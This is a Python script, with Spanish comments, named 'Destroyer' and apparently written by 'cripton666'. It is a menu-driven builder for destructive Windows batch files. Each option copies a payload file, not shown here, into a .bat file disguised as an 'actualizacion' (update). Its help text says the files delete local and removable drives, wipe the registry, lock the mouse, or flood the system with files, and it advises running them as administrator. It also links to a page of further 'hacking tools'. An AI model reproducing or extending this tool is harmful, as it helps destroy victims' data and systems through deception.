#Destroyer es una Herramienta para crear vinarios maliciosos para windows 
#Creador de la Herramienta cripton666

#Librerias
from io import open 
import time
import os
import webbrowser

#colores
negro = '\033[30m'
rojo = '\033[31m'
verde = '\033[32m'
amarillo = '\033[33m'
azul = '\033[34m'
rosado = '\033[35m'
calipso= '\033[36m'
blanco = '\033[37m'
cierre = '\033[39m'


def panel_de_ayuda():
      print(amarillo+"""      Bienvenido(a) al panel de ayuda
      En esta herramienta se encuentran distintos tipos de script
      programado por cripton666 en python3
      que van a Interferir en el funcionamiento normal del sistema operativo,
      ya sea de windows xp hasta window 11, eliminando los discos locales y extraibles
      no se nesesita tener instalados python o python3 para poder ejecutar ya que 
      las extenciones estan en .bat que lo lee windows como propio
      lo rrecomendable es ejecutar como administrador.""")




#comienzo de ciclo
time.sleep(1.0)
os.system("clear")
def menu():
      
      os.system("clear")
      print (calipso+"     _____            _                             ")
      print ("    |  __ \          | |                             ")
      print ("    | |  | | ___  ___| |_ _ __ ___  _   _  ___ _ __  ")
      print ("    | |  | |/ _ \/ __| __| '__/ _ \| | | |/ _ \ '__| ")
      print ("    | |__| |  __/\__ \ |_| | | (_) | |_| |  __/ |    ")
      print ("    |_____/ \___||___/\__|_|  \___/ \__, |\___|_|     ")
      print ("                                     __/ |            ")
      print ("                                    |___/             ")
      print (cierre+"")
      print(rosado+"Derechos reservados al programador(Cripton666)")
      print(cierre+"")
#Datos de entrada!
print(menu())
print(amarillo+"Bienvenido(a) a Destroyer !")
time.sleep(2.0)
print(menu())
#ciclo del script
print(rojo+"[1]",cierre+verde+"Eliminar Windows")       
print(rojo+"[2]",cierre+verde+"Eliminar Windows tras reinicio") 
print(rojo+"[3]",cierre+verde+"Borra rejistro etc y mouse") 
print(rojo+"[4]",cierre+verde+"Herramientas Hacking de Cripton")
print(rojo+"[5]",cierre+verde+"Virus tony(colapsará de ficheros)")
print(rojo+"[6]",cierre+verde+"Panel de ayuda") 
print("\n")

x=int(input(blanco+"Ingrese una opcion :"))
# e.txt eliminar windows
if x == 1:
      os.system("clear")
      print(menu())
      time.sleep(1.0)
      print(rojo+"Creando vínculos")
      os.system("cp e.txt actualizacion.bat")
elif x == 2:
       #al reiniciar nesecita formateo
        os.system("clear")
        print(menu())
        time.sleep(1.0)
        print(rojo+"Creando vínculos")
        os.system("cp r.txt actualizacionR.bat")      
elif x == 3:
      #Borra rejistros etc Blockea mouse
        os.system("clear")
        print(menu())
        time.sleep(1.0)
        print(rojo+"Creando vínculos")
        os.system("cp b.txt actualizacionb.bat") 
elif x == 4:
      #pagina de descargas de cripton
        os.system("clear")
        print(menu())
        time.sleep(1.0)
        print(rojo+"Pagina web de descargas de cripton")
        time.sleep(2.0)
        webbrowser.open("https://cripton6661989.wixsite.com/hack/descargas")  
elif x == 5:
      #Crea ficheros de forma repetitiva
        os.system("clear")
        print(menu())
        time.sleep(1.0)
        print(rojo+"Creando vínculos")
        os.system("cp t.txt actualizaciont.bat")    
elif x == 6:
      #Panel de ayuda
        os.system("clear")
        print(menu())
        time.sleep(1.0)
        print(panel_de_ayuda())            
else:
      print(amarillo+"La opcion no esta permitida :(") 
      os.system("clear")     



